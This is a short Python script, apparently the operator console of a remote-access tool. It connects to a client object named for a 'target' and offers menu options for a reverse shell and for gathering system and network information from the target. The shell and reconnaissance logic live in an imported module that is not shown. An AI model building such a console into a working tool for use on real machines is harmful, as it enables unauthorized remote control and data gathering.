from ObjetClientTarget import Client


def menu():
    while True:
        print("\t \t ============ \n \t \t \t MENU\n \t \t ============")
        print("welcome, what's your choice?")
        print("1. Reverse Shell \n"
              "2. Get info \n"
              "3. Quit \n")
        choice = input("> ")

        if choice == "1":
            client.reverse_shell_send_command()
        if choice == "2":
            menu_getinfo()
        if choice == "3":
            break


def menu_getinfo():
    print("\t \t ============ \n \t \t \t MENU -- Get Info\n \t \t ============")
    print("1. Global information")
    print("2. Network information")
    print("3. Quit")
    choice = input("> ")

    if choice == "1":
        info = "getinfo_generality"
        client.getinfo(info)
    if choice == "2":
        client.getinfo("getinfo_network")


client = Client()
client.connect_to_server()
menu()
client.quit()
